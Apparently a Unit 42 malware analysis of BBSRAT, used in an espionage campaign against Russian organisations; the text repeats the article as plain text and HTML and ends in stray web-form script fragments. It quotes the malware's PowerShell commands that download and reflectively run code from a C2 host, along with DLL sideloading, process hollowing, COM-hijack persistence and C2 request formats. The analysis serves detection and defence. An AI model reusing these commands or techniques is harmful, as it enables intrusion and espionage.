The attack was found to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware family.\n\nESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and general information stealing. Based on data collected from Palo Alto Networks AutoFocus threat intelligence, we discovered continued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a concentration of attacks in late October and continuing into December.\n\nThe adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and attack vectors. However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific behavior patterns and architecture. We have named this tool \u201cBBSRAT.\u201d\nTargeting and Infrastructure\nAs described in earlier reports on \u201cRoaming Tiger\u201d, the attack observed in August 2015 used weaponized exploit documents that leave Russian language decoy document files after infecting the system. The files exploit the well-known Microsoft Office vulnerability, CVE-2012-0158, to execute malicious code in order to take control of the targeted systems.\n\n\nFigure 1 Spear-phishing email delivering BBSRAT\nIn one case, the adversary impersonated an individual from the organization Vigstar, a Russian-based research organization in charge of the development of satellite communications and special purpose wireless devices for the Russian Federation\u2019s defense and security agencies. The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was found on a job board website for a job opening at Vigstar.\n\nThe rough translation of the body of the email is as follows:\n\nI send you a \"list of international exhibitions of military, civil and dual-purpose, conducted in 2015 on the territory of the Russian Federation and foreign states.\" Waiting for your reply!\n\nFigure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international exhibitions that were conducted on Russian territory in 2015.\n\n\nFigure 2 Decoy document that is opened after the malicious document has infected the system\nIn more recent months, we have identified several other potential Russian victims using AutoFocus. Analysis of the command and control (C2) infrastructure shows that the newly discovered samples of BBSRAT used the same C2 domains as previously published in the \u201cRoaming Tiger\u201d campaign, including transactiona[.]com and futuresgold[.]com. Interestingly, all of the previously published C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all. This may indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose-built variants and\/or infrastructure for each of the intended targets.\n\n\nFigure 3 Command and control infrastructure\n\nBBSRAT Malware Analysis\nDeployment Technique #1\nBBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was discovered to contain BBSRAT. When the dropper first runs, it will generate a path in the %TEMP% directory. The generated filename is 10-16 uppercase alphabetic characters, and ends with a \u2018.TMP\u2019 file extension. The dropper will continue to write an embedded cab file in this location.\n\n\nFigure 4 Header of CAB file dropped by BBSRAT\nThe malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on the target machine:\n\n\t%ALLUSERSPROFILE%\\SSONSVR\n\t%ALLUSERSPROFILE%\\Application Data\\SSONSVR\n\nUsing the built-in expand.exe utility provided by Microsoft Windows, the dropper executes the following command, which will expand the CAB file and write the results to the provided directory:\n\nexpand.exe \"%TEMP%\\[temp_file]\" Destination \"[chosen_path]\\SSONSVR\"\n\nThis results in the following three files being written to the SSONSVR directory:\n\n\taclmain.sdb\n\tpnipcn.dll\n\tssonsvr.exe\n\nThe 'ssonsvr.exe' file is a legitimate Citrix executable that will be used to sideload the malicious \u2018pnipcn.dll\u2019 file. The \u2018aclmain.sdb\u2019 file contains code that will eventually be loaded by the \u2018pnipcn.dll\u2019 file.\n\nThe malware finally executes \u2018ssonsvr.exe\u2019 via a call to ShellExecuteW.\n\n\nFigure 5 Execution flow of dropper expanding CAB file\nWhen \u2018ssonsvr.exe\u2019 is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding the following environment string:\n\n%SystemRoot%\\System32\\msiexec.exe\n\nIt will then spawn a suspended instance of msiexec.exe in a new process. The malware proceeds to load code from the \u2018aclmain.sdb\u2019 file and performs process hollowing against this instance of msiexec.exe prior to resuming the process.\n\n\nFigure 6 Sideloading execution flow\nIn order to ensure persistence, the following registry key is written on the victim\u2019s machine:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe : [path_to_ssonsvr.exe]\nDeployment Technique #2\nIn the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the Invoke-ReflectivePEInjection.ps1 script from the PowerSploit framework.\n\nWhen the downloader executes, it will first decrypt the following two strings using a 5-byte XOR key of \u201c\\x01\\x02\\x03\\x04\\x05\u201d:\n\n\"powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:\/\/testzake[.]com\/IR.ps1');Invoke-ReflectivePEInjection -PEUrl http:\/\/testzake[.]com\/s.exe\"\n\n\"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:\/\/testzake[.]com\/IR.ps1');Invoke-ReflectivePEInjection -PEUrl http:\/\/testzake[.]com\/s.exe\"\n\nThese strings are then sequentially executed via calls to WinExec. As we can see, the second command is specifically crafted to run on 64-bit versions of Microsoft Windows. The commands in question will download an executable file and run it within the context of the powershell process.\n\nWhen the above commands are executed, the downloader will initially download the \u2018IR.ps1\u2019 powershell script from the specified URL:\n\n\nFigure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit script\nThis Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made. The malware then invokes this script with a URL that points to an additional executable file. This downloaded executable contains a copy of the BBSRAT malware family.\n\nThe downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two previously stated Powershell commands when the DLL is loaded. This DLL is dropped to one of the following locations:\n\n%SYSTEMROOT%\\web\\srvcl32.dll\n\n%APPDATA%\\web\\srvcl32.dll\n\nAdditionally, the following registry keys are set depending on the system\u2019s CPU architecture:\n\nHKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32\\ThreadingModel - \"Both\"\nHKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32\\Default - [path_to_srvcl32.dll]\n\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\InprocServer32\\ThreadingModel - \"Both\"\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\InprocServer32\\Default - [path_to_srvcl32.dll]\n\nThe COM object for {42aedc87-2188-41fd-b9a3-0c966feabec1} is specific to \u2018MruPidlList\u2019, while the COM object for {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} is specific to \u2018Microsoft WBEM New Event Subsystem\u2019. This ensures that the DLL specified will load when Microsoft Windows starts. It is a technique that was used by the ZeroAccess rootkit when it initially surfaced.\nBBSRAT Execution\nAfter being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following libraries at runtime:\n\n\tntdll.dll\n\tkernel32.dll\n\tuser32.dll\n\tadvapi32.dll\n\tgdi32.dll\n\tws2_32.dll\n\tshell32.dll\n\tpsapi.dll\n\tSecur32.dll\n\tWtsApi32.dll\n\tNetapi32.dll\n\tVersion.dll\n\tCrypt32.dll\n\tWininet.dll\n\nThe following mutex is then created to ensure a single instance of BBSRAT is running at a given time:\n\nGlobal\\GlobalAcProtectMutex\n\nThroughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below demonstrating BBSRAT making a call to the WSAStartup function:\n\n\nFigure 8 BBSRAT calling WSAStartup function\nThe malware proceeds to parse the stored embedded network configuration and spawns a series of threads responsible for network communication. This includes a series of HTTP or HTTPS requests, such as the following:\n\nGET \/bbs\/1\/forum.php?sid=1 HTTP\/1.1\nCookie: A46A8AA9-D7D6-43FB-959DC96E\nContent-Length:\nUser-Agent: Mozilla\/4.0 (compatible; Windows NT 5.1)\nConnection: Keep-Alive\nHost: transactiona[.]com\nCache-Control: no-cache\nAccept: *\/*\nContent-Type:\n\nIn the above example, the \u20181\u2019 used both in the URI and the sid GET parameter is a global incremental counter. Every subsequent request made by BBSRAT increments this counter by one. Additionally, all variants of BBSRAT we have found use the same URL for command and control (C2) communication.\n\nWhen first executed, the malware will exfiltrate data about the victim\u2019s machine via a POST request to the \u2018\/bbs\/[counter]\/forum.php?sid=[counter]\u2019 URL. Despite the fact that the information about these attackers has been public for over a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed playbook.       <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p>In late 2014, <a href="https://2014.zeronights.org/assets/files/slides/roaming_tiger_zeronights_2014.pdf" target="_blank">ESET presented an attack campaign</a> that had been observed over a period of time targeting Russia and other Russian speaking nations, dubbed “Roaming Tiger”. The attack was found to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware family.</p>
<p>ESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and general information stealing. Based on data collected from Palo Alto Networks <a href="https://www.paloaltonetworks.com/products/platforms/subscriptions/autofocus.html" target="_blank">AutoFocus</a> threat intelligence, we discovered continued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a concentration of attacks in late October and continuing into December.</p>
<p>The adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and attack vectors. However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific behavior patterns and architecture. We have named this tool “BBSRAT.”<span id="more-11629"></span></p>
<h3>Targeting and Infrastructure</h3>
<p>As described in earlier reports on “Roaming Tiger”, the attack observed in August 2015 used weaponized exploit documents that leave Russian language decoy document files after infecting the system. The files exploit the well-known Microsoft Office vulnerability, CVE-2012-0158, to execute malicious code in order to take control of the targeted systems.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT1.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-11630" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT1-500x392.png" alt="BBSRAT1" width="500" height="392" /></a></p>
<p style="text-align: center;">Figure 1 Spear-phishing email delivering BBSRAT</p>
<p>In one case, the adversary impersonated an individual from the organization Vigstar, a Russian-based research organization in charge of the development of satellite communications and special purpose wireless devices for the Russian Federation’s defense and security agencies. The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was found on a job board website for a job opening at Vigstar.</p>
<p>The rough translation of the body of the email is as follows:</p>
<p><em>I send you a "list of international exhibitions of military, civil and dual-purpose, conducted in 2015 on the territory of the Russian Federation and foreign states." Waiting for your reply!</em></p>
<p>Figure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international exhibitions that were conducted on Russian territory in 2015.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT2.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-11631" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT2-500x351.png" alt="BBSRAT2" width="500" height="351" /></a></p>
<p style="text-align: center;">Figure 2 Decoy document that is opened after the malicious document has infected the system</p>
<p>In more recent months, we have identified several other potential Russian victims using AutoFocus. Analysis of the command and control (C2) infrastructure shows that the newly discovered samples of BBSRAT used the same C2 domains as previously published in the “Roaming Tiger” campaign, including transactiona[.]com and futuresgold[.]com. Interestingly, all of the previously published C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all. This may indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose-built variants and/or infrastructure for each of the intended targets.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT3.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-11632" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT3-500x474.png" alt="BBSRAT3" width="500" height="474" /></a></p>
<p style="text-align: center;">Figure 3 Command and control infrastructure</p>
<h3>BBSRAT Malware Analysis</h3>
<h4>Deployment Technique #1</h4>
<p>BBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was discovered to contain BBSRAT. When the dropper first runs, it will generate a path in the %TEMP% directory. The generated filename is 10-16 uppercase alphabetic characters, and ends with a ‘.TMP’ file extension. The dropper will continue to write an embedded cab file in this location.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT4.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-11633" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT4-500x178.png" alt="BBSRAT4" width="500" height="178" /></a></p>
<p style="text-align: center;">Figure 4 Header of CAB file dropped by BBSRAT</p>
<p>The malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on the target machine:</p>
<ul>
<li>%ALLUSERSPROFILE%\SSONSVR</li>
<li>%ALLUSERSPROFILE%\Application Data\SSONSVR</li>
</ul>
<p>Using the built-in <a href="https://support.microsoft.com/en-us/kb/80751">expand.exe utility</a> provided by Microsoft Windows, the dropper executes the following command, which will expand the CAB file and write the results to the provided directory:</p>
<p><em>expand.exe "%TEMP%\[temp_file]" Destination "[chosen_path]\SSONSVR"</em></p>
<p>This results in the following three files being written to the SSONSVR directory:</p>
<ul>
<li>aclmain.sdb</li>
<li>pnipcn.dll</li>
<li>ssonsvr.exe</li>
</ul>
<p>The 'ssonsvr.exe' file is a legitimate Citrix executable that will be used to <a href="https://attack.mitre.org/wiki/DLL_side-loading">sideload</a> the malicious ‘pnipcn.dll’ file. The ‘aclmain.sdb’ file contains code that will eventually be loaded by the ‘pnipcn.dll’ file.</p>
<p>The malware finally executes ‘ssonsvr.exe’ via a call to <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx">ShellExecuteW</a>.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT5.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-11634" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT5-500x105.png" alt="BBSRAT5" width="500" height="105" /></a></p>
<p style="text-align: center;">Figure 5 Execution flow of dropper expanding CAB file</p>
<p>When ‘ssonsvr.exe’ is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding the following environment string:</p>
<p><em>%SystemRoot%\System32\msiexec.exe</em></p>
<p>It will then spawn a suspended instance of msiexec.exe in a new process. The malware proceeds to load code from the ‘aclmain.sdb’ file and performs process hollowing against this instance of msiexec.exe prior to resuming the process.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT6.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-11635" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT6-500x79.png" alt="BBSRAT6" width="500" height="79" /></a></p>
<p style="text-align: center;">Figure 6 Sideloading execution flow</p>
<p>In order to ensure persistence, the following registry key is written on the victim’s machine:</p>
<p><em>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe : [path_to_ssonsvr.exe]</em></p>
<h4>Deployment Technique #2</h4>
<p>In the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the <a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection.ps1</a> script from the PowerSploit framework.</p>
<p>When the downloader executes, it will first decrypt the following two strings using a 5-byte XOR key of “\x01\x02\x03\x04\x05”:</p>
<p><em>"powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke-ReflectivePEInjection -PEUrl http://testzake[.]com/s.exe"</em></p>
<p><em>"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke-ReflectivePEInjection -PEUrl http://testzake[.]com/s.exe"</em></p>
<p>These strings are then sequentially executed via calls to WinExec. As we can see, the second command is specifically crafted to run on 64-bit versions of Microsoft Windows. The commands in question will download an executable file and run it within the context of the powershell process.</p>
<p>When the above commands are executed, the downloader will initially download the ‘IR.ps1’ powershell script from the specified URL:</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT7.png" rel="wpdevart_lightbox"><img decoding="async" class="aligncenter size-large wp-image-11636" src="http://blog.paloaltonetworks.com/wp-content/uploads/2015/12/BBSRAT7-500x234.png" alt="BBSRAT7" width="500" height="234" /></a></p>
<p style="text-align: center;">Figure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit script</p>
<p>This Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made. The malware then invokes this script with a URL that points to an additional executable file. This downloaded executable contains a copy of the BBSRAT malware family.</p>
<p>The downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two previously stated Powershell commands when the DLL is loaded. This DLL is dropped to one of the following locations:</p>
<p><em>%SYSTEMROOT%\web\srvcl32.dll</em></p>
<p><em>%APPDATA%\web\srvcl32.dll</em></p>
<p>Additionally, the following registry keys are set depending on the system’s CPU architecture:</p>
<p><em>HKU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\ThreadingModel - "Both"<br />
</em><em>HKU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\Default - [path_to_srvcl32.dll]</em></p>
<p><em>HKLM\SOFTWARE\Classes\CLSID\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\InprocServer32\ThreadingModel - "Both"<br />
</em><em>HKLM\SOFTWARE\Classes\CLSID\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\InprocServer32\Default - [path_to_srvcl32.dll]</em></p>

<h4>BBSRAT Execution</h4>
<p>After being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following libraries at runtime:</p>
<ul>
<li>ntdll.dll</li>
<li>kernel32.dll</li>
<li>user32.dll</li>
<li>advapi32.dll</li>
<li>gdi32.dll</li>
<li>ws2_32.dll</li>
<li>shell32.dll</li>
<li>psapi.dll</li>
<li>Secur32.dll</li>
<li>WtsApi32.dll</li>
<li>Netapi32.dll</li>
<li>Version.dll</li>
<li>Crypt32.dll</li>
<li>Wininet.dll</li>
</ul>
<p>The following mutex is then created to ensure a single instance of BBSRAT is running at a given time:</p>
<p><em>Global\GlobalAcProtectMutex</em></p>
<p>Throughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below demonstrating BBSRAT making a call to the WSAStartup function:</p>

<em>Cookie: A46A8AA9-D7D6-43FB-959DC96E</em><br />

<em>Content-Type:</em></p>
<p>In the above example, the ‘1’ used both in the URI and the sid GET parameter is a global incremental counter. Every subsequent request made by BBSRAT increments this counter by one. <h3>Conclusion</h3>
<p>As in many of the previous articles regarding espionage-motivated adversaries and possible nation-state campaigns, what is being observed in this attack campaign is a continued operation and evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have become public knowledge. Despite the fact that the information about these attackers has been public for over a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed playbook. We urge organizations to use the data from Unit 42 and other threat intelligence sources is paramount to proactively secure themselves and prevent attacks.</p>
<p><a href="https://www.paloaltonetworks.com/products/technologies/wildfire.html">WildFire</a> properly classifies BBSRAT malware samples as malicious. We have released DNS signatures to block access to the C2 domain names included in this report. AutoFocus users can explore these attacks using the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.BBSRAT">BBSRAT</a> malware family tag.</p>

		}
		setTimeout(function() {
			$(email).focus();

		subscribeSuccess = false;
		$(subscription_form_button).addClass('is-disabled', true);
	} 
	$(subscription_form).submit(function(e) {
		e.preventDefault();
		e.stopImmediatePropagation();
		updateEmailMask();
		var success = true;
		var form = $(this);
		var mail = form.find('input[name="Email"]');
		
		if (mail.val() === '') {
			mail.addClass('has-error');
			showError(1);
			success = false;	
		}  else if (!isEmail(mail.val())){
			showError(2);
			success = false;
		}
		else {
			mail.removeClass('has-error');
			$('.error-mail').addClass('d-none');
		}

		if (!subscribeSuccess) {
			$('.error-recaptcha').removeClass('d-none');
		} else {
			$('.error-recaptcha').addClass('d-none');
		}

		if (success && subscribeSuccess) {
			$.ajax({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				beforeSend: function() {
                 form.find('button').addClass('is-loading');
    			},
				success: function(msg) {
					form.find('.form-success-message').html('<p class="success-message">You have been successfully subscribed</p>');
					form.find('button').removeClass('is-loading');
					$(email).val('');
					clearError();
				},
				error: function(jqXHR, textStatus, errorThrown) {
					$(subscription_form_button).addClass('is-disabled', true);
					form.find('button').removeClass('is-loading');
					
				}
			});
		}
		return false;
	});
	function showError(error_type){
		if(error_type == 1) {
			$('.error-mail').text("Please enter the email address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		} else if(error_type == 2){
			$('.error-mail').text("Please provide a valid e-mail address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		}	
		$(subscription_form_button).removeClass('is-loading');
	}

		$('.error-mail').text("").removeClass('error-show');;
		$(subscription_form_button).removeClass('is-loading');
		$(subscription_form_button).removeClass('is-disabled');
	}

			clearError();
		} else{
			showError(2);			  
		}
